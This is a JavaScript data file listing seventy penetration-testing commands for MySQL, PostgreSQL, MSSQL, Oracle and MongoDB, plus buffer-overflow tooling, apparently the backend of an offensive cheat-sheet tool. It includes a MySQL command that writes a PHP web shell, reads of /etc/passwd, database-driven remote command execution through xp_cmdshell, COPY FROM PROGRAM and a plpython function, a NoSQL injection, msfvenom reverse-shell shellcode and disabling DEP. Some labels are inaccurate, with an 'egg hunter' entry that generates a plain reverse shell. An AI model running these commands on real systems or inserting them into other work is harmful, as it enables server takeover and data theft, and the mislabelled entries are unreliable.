// Database Security Testing & Buffer Overflow Commands Database

const DATABASE_COMMANDS = {
    "MySQL Security Testing": [
        { id: 1, name: "MySQL Login", command: "mysql -h {ip} -u {username} -p{password}", description: "Connect to MySQL server", category: "MySQL Security" },
        { id: 2, name: "MySQL Version", command: "mysql -h {ip} -u {username} -p{password} -e 'SELECT VERSION();'", description: "Get MySQL version", category: "MySQL Security" },
        { id: 3, name: "List Databases", command: "mysql -h {ip} -u {username} -p{password} -e 'SHOW DATABASES;'", description: "List all databases", category: "MySQL Security" },
        { id: 4, name: "List Tables", command: "mysql -h {ip} -u {username} -p{password} -e 'SHOW TABLES FROM {database};'", description: "List tables in database", category: "MySQL Security" },
        { id: 5, name: "Dump Database", command: "mysqldump -h {ip} -u {username} -p{password} {database} > dump.sql", description: "Dump entire database", category: "MySQL Security" },
        { id: 6, name: "MySQL Users", command: "mysql -h {ip} -u {username} -p{password} -e 'SELECT User,Host FROM mysql.user;'", description: "List MySQL users", category: "MySQL Security" },
        { id: 7, name: "MySQL Privileges", command: "mysql -h {ip} -u {username} -p{password} -e 'SHOW GRANTS FOR {user}@{host};'", description: "Show user privileges", category: "MySQL Security" },
        { id: 8, name: "UDF Function", command: "mysql -h {ip} -u {username} -p{password} -e 'SELECT * FROM mysql.func;'", description: "List user-defined functions", category: "MySQL Security" },
        { id: 9, name: "Load File", command: "mysql -h {ip} -u {username} -p{password} -e 'SELECT LOAD_FILE(\"/etc/passwd\");'", description: "Read file using MySQL", category: "MySQL Security" },
        { id: 10, name: "Write File", command: "mysql -h {ip} -u {username} -p{password} -e 'SELECT \"<?php system($_GET[cmd]); ?>\" INTO OUTFILE \"/var/www/html/shell.php\";'", description: "Write web shell via MySQL", category: "MySQL Security" }
    ],
    
    "PostgreSQL Security Testing": [
        { id: 11, name: "PostgreSQL Connect", command: "psql -h {ip} -U {username} -d {database}", description: "Connect to PostgreSQL", category: "PostgreSQL Security" },
        { id: 12, name: "PostgreSQL Version", command: "psql -h {ip} -U {username} -d {database} -c 'SELECT version();'", description: "Get PostgreSQL version", category: "PostgreSQL Security" },
        { id: 13, name: "List Databases", command: "psql -h {ip} -U {username} -d {database} -c '\\l'", description: "List PostgreSQL databases", category: "PostgreSQL Security" },
        { id: 14, name: "List Tables", command: "psql -h {ip} -U {username} -d {database} -c '\\dt'", description: "List tables in database", category: "PostgreSQL Security" },
        { id: 15, name: "PostgreSQL Users", command: "psql -h {ip} -U {username} -d {database} -c 'SELECT usename FROM pg_user;'", description: "List PostgreSQL users", category: "PostgreSQL Security" },
        { id: 16, name: "PostgreSQL Copy", command: "psql -h {ip} -U {username} -d {database} -c 'COPY (SELECT * FROM users) TO STDOUT;'", description: "Export data from PostgreSQL", category: "PostgreSQL Security" },
        { id: 17, name: "Large Objects", command: "psql -h {ip} -U {username} -d {database} -c 'SELECT lo_import(\\'/etc/passwd\\');'", description: "Import file as large object", category: "PostgreSQL Security" },
        { id: 18, name: "Command Execution", command: "psql -h {ip} -U {username} -d {database} -c 'COPY test FROM PROGRAM \\'whoami\\';'", description: "Execute system command", category: "PostgreSQL Security" },
        { id: 19, name: "PostgreSQL Extensions", command: "psql -h {ip} -U {username} -d {database} -c 'SELECT * FROM pg_available_extensions;'", description: "List available extensions", category: "PostgreSQL Security" },
        { id: 20, name: "PL/Python", command: "psql -h {ip} -U {username} -d {database} -c 'CREATE FUNCTION exec(cmd text) RETURNS text AS $$ import os; return os.popen(cmd).read() $$ LANGUAGE plpython3u;'", description: "Create Python function for RCE", category: "PostgreSQL Security" }
    ],
    
    "MSSQL Security Testing": [
        { id: 21, name: "MSSQL Connect", command: "sqlcmd -S {ip} -U {username} -P {password}", description: "Connect to MSSQL server", category: "MSSQL Security" },
        { id: 22, name: "MSSQL Version", command: "sqlcmd -S {ip} -U {username} -P {password} -Q 'SELECT @@VERSION'", description: "Get MSSQL version", category: "MSSQL Security" },
        { id: 23, name: "List Databases", command: "sqlcmd -S {ip} -U {username} -P {password} -Q 'SELECT name FROM sys.databases'", description: "List MSSQL databases", category: "MSSQL Security" },
        { id: 24, name: "Current User", command: "sqlcmd -S {ip} -U {username} -P {password} -Q 'SELECT SYSTEM_USER'", description: "Get current database user", category: "MSSQL Security" },
        { id: 25, name: "Database Users", command: "sqlcmd -S {ip} -U {username} -P {password} -Q 'SELECT name FROM sys.database_principals'", description: "List database users", category: "MSSQL Security" },
        { id: 26, name: "Enable xp_cmdshell", command: "sqlcmd -S {ip} -U {username} -P {password} -Q 'EXEC sp_configure \"xp_cmdshell\", 1; RECONFIGURE;'", description: "Enable command execution", category: "MSSQL Security" },
        { id: 27, name: "Execute Command", command: "sqlcmd -S {ip} -U {username} -P {password} -Q 'EXEC xp_cmdshell \"whoami\"'", description: "Execute system command", category: "MSSQL Security" },
        { id: 28, name: "Linked Servers", command: "sqlcmd -S {ip} -U {username} -P {password} -Q 'SELECT * FROM sys.servers'", description: "List linked servers", category: "MSSQL Security" },
        { id: 29, name: "MSSQL Jobs", command: "sqlcmd -S {ip} -U {username} -P {password} -Q 'SELECT * FROM msdb.dbo.sysjobs'", description: "List SQL Server jobs", category: "MSSQL Security" },
        { id: 30, name: "Backup Database", command: "sqlcmd -S {ip} -U {username} -P {password} -Q 'BACKUP DATABASE {database} TO DISK = \"C:\\temp\\backup.bak\"'", description: "Backup database to file", category: "MSSQL Security" }
    ],
    
    "Oracle Security Testing": [
        { id: 31, name: "Oracle Connect", command: "sqlplus {username}/{password}@{ip}:{port}/{sid}", description: "Connect to Oracle database", category: "Oracle Security" },
        { id: 32, name: "Oracle Version", command: "sqlplus {username}/{password}@{ip}:{port}/{sid} -s 'SELECT banner FROM v$version;'", description: "Get Oracle version", category: "Oracle Security" },
        { id: 33, name: "Oracle SID", command: "tnscmd10g version -h {ip}", description: "Get Oracle SID", category: "Oracle Security" },
        { id: 34, name: "Default Accounts", command: "sqlplus {username}/{password}@{ip}:{port}/{sid} -s 'SELECT username FROM dba_users WHERE account_status = \"OPEN\";'", description: "List active user accounts", category: "Oracle Security" },
        { id: 35, name: "Oracle Privileges", command: "sqlplus {username}/{password}@{ip}:{port}/{sid} -s 'SELECT * FROM user_role_privs;'", description: "List user privileges", category: "Oracle Security" },
        { id: 36, name: "Oracle Tables", command: "sqlplus {username}/{password}@{ip}:{port}/{sid} -s 'SELECT table_name FROM user_tables;'", description: "List user tables", category: "Oracle Security" },
        { id: 37, name: "Oracle Packages", command: "sqlplus {username}/{password}@{ip}:{port}/{sid} -s 'SELECT object_name FROM user_objects WHERE object_type = \"PACKAGE\";'", description: "List packages", category: "Oracle Security" },
        { id: 38, name: "Java Privileges", command: "sqlplus {username}/{password}@{ip}:{port}/{sid} -s 'SELECT * FROM user_java_policy;'", description: "Check Java security policy", category: "Oracle Security" },
        { id: 39, name: "TNS Poison", command: "tnscmd10g status -h {ip} --dumpfile", description: "TNS listener attack", category: "Oracle Security" },
        { id: 40, name: "Oracle Scheduler", command: "sqlplus {username}/{password}@{ip}:{port}/{sid} -s 'SELECT job_name FROM user_scheduler_jobs;'", description: "List scheduled jobs", category: "Oracle Security" }
    ],
    
    "MongoDB Security Testing": [
        { id: 41, name: "MongoDB Connect", command: "mongo {ip}:{port}/{database}", description: "Connect to MongoDB", category: "MongoDB Security" },
        { id: 42, name: "MongoDB Version", command: "mongo {ip}:{port} --eval 'db.version()'", description: "Get MongoDB version", category: "MongoDB Security" },
        { id: 43, name: "List Databases", command: "mongo {ip}:{port} --eval 'show dbs'", description: "List MongoDB databases", category: "MongoDB Security" },
        { id: 44, name: "List Collections", command: "mongo {ip}:{port}/{database} --eval 'show collections'", description: "List collections in database", category: "MongoDB Security" },
        { id: 45, name: "MongoDB Users", command: "mongo {ip}:{port} --eval 'db.system.users.find()'", description: "List MongoDB users", category: "MongoDB Security" },
        { id: 46, name: "Find Documents", command: "mongo {ip}:{port}/{database} --eval 'db.{collection}.find()'", description: "Retrieve documents from collection", category: "MongoDB Security" },
        { id: 47, name: "MongoDB Stats", command: "mongo {ip}:{port}/{database} --eval 'db.stats()'", description: "Get database statistics", category: "MongoDB Security" },
        { id: 48, name: "Server Status", command: "mongo {ip}:{port} --eval 'db.serverStatus()'", description: "Get server status", category: "MongoDB Security" },
        { id: 49, name: "NoSQL Injection", command: "mongo {ip}:{port}/{database} --eval 'db.users.find({\"user\": {\"$ne\": null}, \"password\": {\"$ne\": null}})'", description: "NoSQL injection example", category: "MongoDB Security" },
        { id: 50, name: "Export Collection", command: "mongoexport --host {ip}:{port} --db {database} --collection {collection} --out output.json", description: "Export MongoDB collection", category: "MongoDB Security" }
    ],
    
    "Buffer Overflow Development": [
        { id: 51, name: "Pattern Create", command: "msf-pattern_create -l {length}", description: "Create cyclic pattern for buffer overflow", category: "Buffer Overflow" },
        { id: 52, name: "Pattern Offset", command: "msf-pattern_offset -l {length} -q {pattern}", description: "Find offset in cyclic pattern", category: "Buffer Overflow" },
        { id: 53, name: "Generate Shellcode", command: "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f python", description: "Generate shellcode for buffer overflow", category: "Buffer Overflow" },
        { id: 54, name: "Bad Characters", command: "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -b '\\x00\\x0a\\x0d' -f python", description: "Generate shellcode avoiding bad chars", category: "Buffer Overflow" },
        { id: 55, name: "NOP Sled", command: "python -c \"print('\\x90' * {nop_count})\"", description: "Generate NOP sled", category: "Buffer Overflow" },
        { id: 56, name: "GDB Debugging", command: "gdb -q {binary}", description: "Debug binary with GDB", category: "Buffer Overflow" },
        { id: 57, name: "GDB Set Breakpoint", command: "gdb -ex 'break main' -ex 'run' {binary}", description: "Set breakpoint and run in GDB", category: "Buffer Overflow" },
        { id: 58, name: "GDB Examine Memory", command: "gdb -ex 'x/100x $esp' {binary}", description: "Examine stack memory in GDB", category: "Buffer Overflow" },
        { id: 59, name: "OllyDbg Analysis", command: "ollydbg {binary}.exe", description: "Analyze Windows binary in OllyDbg", category: "Buffer Overflow" },
        { id: 60, name: "Immunity Debugger", command: "immunity_debugger {binary}.exe", description: "Debug Windows binary", category: "Buffer Overflow" },
        { id: 61, name: "ROPgadget", command: "ROPgadget --binary {binary} --ropchain", description: "Find ROP gadgets in binary", category: "Buffer Overflow" },
        { id: 62, name: "Checksec", command: "checksec --file={binary}", description: "Check binary security features", category: "Buffer Overflow" },
        { id: 63, name: "ASLR Check", command: "cat /proc/sys/kernel/randomize_va_space", description: "Check ASLR status on Linux", category: "Buffer Overflow" },
        { id: 64, name: "Disable DEP", command: "bcdedit /set nx OptOut", description: "Disable DEP on Windows", category: "Buffer Overflow" },
        { id: 65, name: "Core Dump Analysis", command: "gdb {binary} core", description: "Analyze core dump file", category: "Buffer Overflow" },
        { id: 66, name: "Format String Bug", command: "python -c \"print('%x.' * 10)\"", description: "Test format string vulnerability", category: "Buffer Overflow" },
        { id: 67, name: "Stack Canary Bypass", command: "python -c \"print('A' * {offset} + '\\x00\\x00\\x00\\x00' + 'B' * 4)\"", description: "Stack canary bypass payload", category: "Buffer Overflow" },
        { id: 68, name: "Egg Hunter", command: "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f hex", description: "Generate egg hunter shellcode", category: "Buffer Overflow" },
        { id: 69, name: "SEH Overwrite", command: "python exploit.py --seh", description: "Structured Exception Handler overwrite", category: "Buffer Overflow" },
        { id: 70, name: "ROP Chain Builder", command: "ropper --file {binary} --chain 'execve cmd=/bin/sh'", description: "Build ROP chain automatically", category: "Buffer Overflow" }
    ]
};